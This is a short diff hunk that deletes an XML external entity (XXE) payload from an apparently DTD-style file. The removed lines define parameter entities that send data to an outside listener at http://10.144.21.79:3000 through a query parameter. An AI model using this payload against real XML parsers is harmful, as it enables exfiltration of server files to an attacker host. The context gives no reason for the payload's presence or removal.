@@ -1,3 +1,0 @@
-<!ENTITY % all
-"<!ENTITY % send SYSTEM 'http://10.144.21.79:3000/?xxe=%all;'>"
-> %all;
